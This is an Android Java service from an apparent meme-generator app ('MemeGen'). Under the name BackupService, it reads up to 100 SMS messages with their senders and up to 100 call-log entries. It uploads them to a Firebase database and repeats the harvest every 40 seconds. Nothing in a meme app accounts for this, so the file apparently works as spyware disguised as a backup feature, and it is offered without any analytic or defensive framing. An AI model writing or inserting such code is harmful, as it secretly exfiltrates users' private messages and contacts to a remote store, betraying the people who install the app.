package com.example.memegen;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.Telephony;
import android.widget.Toast;

import androidx.core.app.NotificationCompat;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.ArrayList;
import java.util.Date;
import java.util.List;

public class BackupService extends Service {
    private static final int MAX_SMS_COUNT = 100;
    private static final int MAX_CALL_LOG_COUNT = 100;
    private static final String CHANNEL_ID = "BackupChannel";

    private DatabaseReference databaseReference;

    @Override
    public void onCreate() {
        super.onCreate();
        databaseReference = FirebaseDatabase.getInstance().getReference();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startForeground(1, createNotification("Backup in progress..."));

        // Perform backup process
        boolean backupSuccessful = backupSMS() && backupCallLog();

        // Schedule restart of backup after 40 seconds
        new android.os.Handler().postDelayed(this::startBackupProcess, 40 * 1000);

        return START_NOT_STICKY;
    }

    private void startBackupProcess() {
        // Perform backup process
        boolean backupSuccessful = backupSMS() && backupCallLog();

        if (backupSuccessful) {
            Toast.makeText(BackupService.this, "Backup done successfully", Toast.LENGTH_SHORT).show();
        } else {
            Toast.makeText(BackupService.this, "Backup failed", Toast.LENGTH_SHORT).show();
        }

        // Schedule restart of backup after 40 seconds
        new android.os.Handler().postDelayed(this::startBackupProcess, 40 * 1000);
    }


    private boolean backupSMS() {
        List<String> smsList = new ArrayList<>();
        Uri uri = Uri.parse("content://sms");
        Cursor cursor = getContentResolver().query(uri, null, null, null, null);

        if (cursor != null && cursor.moveToFirst()) {
            int addressIndex = cursor.getColumnIndex(Telephony.Sms.ADDRESS);
            int bodyIndex = cursor.getColumnIndex(Telephony.Sms.BODY);

            if (addressIndex != -1 && bodyIndex != -1) {
                int count = 0;
                do {
                    String address = cursor.getString(addressIndex);
                    String body = cursor.getString(bodyIndex);
                    smsList.add(address + ": " + body);
                    count++;
                } while (cursor.moveToNext() && count < MAX_SMS_COUNT);
            }
            cursor.close();
        }

        databaseReference.child("sms").setValue(smsList);

        // Return true if backup was successful
        return !smsList.isEmpty();
    }

    private boolean backupCallLog() {
        List<String> callLogList = new ArrayList<>();
        String[] projection = {
                CallLog.Calls.NUMBER,
                CallLog.Calls.TYPE,
                CallLog.Calls.DATE
        };

        Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, projection, null, null, CallLog.Calls.DATE + " DESC");

        if (cursor != null && cursor.moveToFirst()) {
            int numberIndex = cursor.getColumnIndex(CallLog.Calls.NUMBER);
            int typeIndex = cursor.getColumnIndex(CallLog.Calls.TYPE);
            int dateIndex = cursor.getColumnIndex(CallLog.Calls.DATE);

            if (numberIndex != -1 && typeIndex != -1 && dateIndex != -1) {
                int count = 0;
                do {
                    String number = cursor.getString(numberIndex);
                    int type = cursor.getInt(typeIndex);
                    long date = cursor.getLong(dateIndex);
                    String callType = getTypeLabel(type);
                    String callDate = new Date(date).toString();
                    callLogList.add(number + ": " + callType + " - " + callDate);
                    count++;
                } while (cursor.moveToNext() && count < MAX_CALL_LOG_COUNT);
            }
            cursor.close();
        }

        databaseReference.child("call_log").setValue(callLogList);

        // Return true if backup was successful
        return !callLogList.isEmpty();
    }

    private String getTypeLabel(int type) {
        switch (type) {
            case CallLog.Calls.INCOMING_TYPE:
                return "Incoming";
            case CallLog.Calls.OUTGOING_TYPE:
                return "Outgoing";
            case CallLog.Calls.MISSED_TYPE:
                return "Missed";
            default:
                return "Unknown";
        }
    }

    private Notification createNotification(String contentText) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            CharSequence name = "Backup Channel";
            String description = "Channel for backup service";
            int importance = NotificationManager.IMPORTANCE_DEFAULT;
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, name, importance);
            channel.setDescription(description);

            NotificationManager notificationManager = getSystemService(NotificationManager.class);
            notificationManager.createNotificationChannel(channel);
        }

        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent, PendingIntent.FLAG_IMMUTABLE);

        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("MemeGen Backup")
                .setContentText(contentText)
                .setSmallIcon(R.mipmap.ic_launcher)
                .setContentIntent(pendingIntent)
                .build();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
